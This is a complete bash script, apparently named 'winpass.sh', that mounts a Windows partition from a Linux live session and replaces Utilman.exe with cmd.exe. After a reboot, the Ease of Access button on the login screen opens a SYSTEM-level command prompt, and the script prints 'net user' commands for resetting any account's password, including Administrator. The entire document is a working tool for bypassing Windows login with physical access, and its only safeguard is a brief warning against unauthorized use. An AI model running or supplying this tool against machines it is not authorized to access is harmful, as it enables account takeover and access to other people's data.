#!/bin/bash
# Script: winpass.sh
# Description: Swap Utilman.exe with cmd.exe on a Windows partition for password reset.
# Usage: sudo ./winpass.sh /dev/sdXY
# Note: Ensure you are in a Linux live session or a Linux distro environment.

# Colors for terminal output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

clear
echo -e "${CYAN}Winpass Bypass${NC}"
echo -e "${YELLOW}By leomuguchia - Swap Utilman.exe with cmd.exe for password reset.${NC}"
echo -e "${RED}WARNING: Use responsibly. Unauthorized access is illegal!${NC}"
echo

# Ensure script is run as root
echo -e "${CYAN}[#] Checking root permissions...${NC}"
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] Error: This script must be run as root. Use sudo.${NC}" >&2
    exit 1
fi

# Ensure a device argument is provided
if [ -z "$1" ]; then
    echo -e "${RED}[!] Error: No device provided. Usage: $0 /dev/sdXY${NC}" >&2
    exit 1
fi

WINDOWS_PARTITION=$1
MOUNT_POINT="/mnt/windows"

# Step 1: Unmount if mounted
echo -e "${CYAN}[+] Checking if $WINDOWS_PARTITION is mounted...${NC}"
if mount | grep "$WINDOWS_PARTITION" > /dev/null; then
    echo -e "${YELLOW}[+] Unmounting $WINDOWS_PARTITION...${NC}"
    sudo umount "$WINDOWS_PARTITION"
    if [ $? -ne 0 ]; then
        echo -e "${RED}[!] Error: Unable to unmount $WINDOWS_PARTITION.${NC}" >&2
        exit 1
    fi
fi

# Step 2: Run ntfsfix
echo -e "${CYAN}[+] Running ntfsfix on $WINDOWS_PARTITION...${NC}"
sudo ntfsfix "$WINDOWS_PARTITION"
if [ $? -ne 0 ]; then
    echo -e "${RED}[!] Error: ntfsfix failed.${NC}" >&2
    exit 1
fi

# Step 3: Mount the partition as read-write
echo -e "${CYAN}[+] Mounting $WINDOWS_PARTITION as read-write...${NC}"
sudo mkdir -p "$MOUNT_POINT"
sudo mount -o rw "$WINDOWS_PARTITION" "$MOUNT_POINT"
if [ $? -ne 0 ]; then
    echo -e "${RED}[!] Error: Unable to mount $WINDOWS_PARTITION.${NC}" >&2
    exit 1
fi

# Define paths
UTILMAN_PATH="$MOUNT_POINT/Windows/System32/Utilman.exe"
CMD_PATH="$MOUNT_POINT/Windows/System32/cmd.exe"
BACKUP_PATH="$MOUNT_POINT/Windows/System32/Utilman.bak"

# Step 4: Backup Utilman.exe
echo -e "${CYAN}[+] Backing up Utilman.exe...${NC}"
if [ -f "$UTILMAN_PATH" ]; then
    sudo mv "$UTILMAN_PATH" "$BACKUP_PATH"
    echo -e "${YELLOW}[+] Backup completed: Utilman.exe -> Utilman.bak${NC}"
else
    echo -e "${RED}[!] Error: Utilman.exe not found.${NC}" >&2
    sudo umount "$MOUNT_POINT"
    exit 1
fi

# Step 5: Replace Utilman.exe with cmd.exe
echo -e "${CYAN}[+] Replacing Utilman.exe with cmd.exe...${NC}"
if [ -f "$CMD_PATH" ]; then
    sudo cp "$CMD_PATH" "$UTILMAN_PATH"
    echo -e "${YELLOW}[+] Replacement complete: Utilman.exe -> cmd.exe${NC}"
else
    echo -e "${RED}[!] Error: cmd.exe not found. Restoring original Utilman.exe...${NC}"
    sudo mv "$BACKUP_PATH" "$UTILMAN_PATH"
    sudo umount "$MOUNT_POINT"
    exit 1
fi

# Step 6: Unmount the partition
echo -e "${CYAN}[+] Unmounting $WINDOWS_PARTITION...${NC}"
sudo umount "$MOUNT_POINT"
if [ $? -eq 0 ]; then
    echo -e "${YELLOW}[+] Unmounted successfully.${NC}"
else
    echo -e "${RED}[!] Warning: Failed to unmount. Ensure partition is not in use.${NC}"
fi

# Final message
echo
echo -e "${CYAN}Operation Complete.${NC}"
echo -e "${YELLOW}To reset the password, reboot into Windows, press Ease of Access, and type:${NC}"
echo -e "${CYAN}net user <username> <newpassword>${NC}"
echo -e "${YELLOW}Example: net user Administrator NewPassword123${NC}"
echo
echo -e "${RED}IMPORTANT: Restore Utilman.exe for system integrity after use.${NC}"
echo -e "${CYAN}Thank you for using Winpass!${NC}"
